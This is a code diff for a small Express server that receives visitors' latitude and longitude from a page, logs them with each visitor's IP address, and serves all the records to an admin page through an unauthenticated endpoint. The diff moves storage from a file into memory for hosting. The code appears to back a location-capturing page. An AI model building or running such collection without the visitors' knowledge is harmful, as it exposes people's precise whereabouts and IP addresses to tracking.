@@ -1,40 +1,33 @@
 const express = require("express");
-const fs = require("fs");
-const path = require("path");
-
 const app = express();
+
 app.use(express.json());
 app.use(express.static("public"));
 
-const LOG_FILE = "logs.json";
+// 🔐 In-memory storage (RAM)
+let locationLogs = [];
 
-// first time empty file
-if (!fs.existsSync(LOG_FILE)) {
-  fs.writeFileSync(LOG_FILE, "[]");
-}
-
-// receive location from v.html
+// receive location
 app.post("/log-location", (req, res) => {
-  const data = req.body;
+  const { lat, lon } = req.body;
 
-  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
-  logs.push({
-    time: new Date().toISOString(),
+  locationLogs.push({
+    time: new Date().toLocaleString(),
     ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
-    latitude: data.lat,
-    longitude: data.lon
+    latitude: lat,
+    longitude: lon
   });
 
-  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
   res.json({ status: "logged" });
 });
 
-// send logs to admin.html
+// send logs to admin
 app.get("/get-logs", (req, res) => {
-  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
-  res.json(logs);
+  res.json(locationLogs);
 });
 
-app.listen(3000, () => {
-  console.log("Server running on http://localhost:3000");
+// hosting compatible port
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log("Server running on port", PORT);
 });
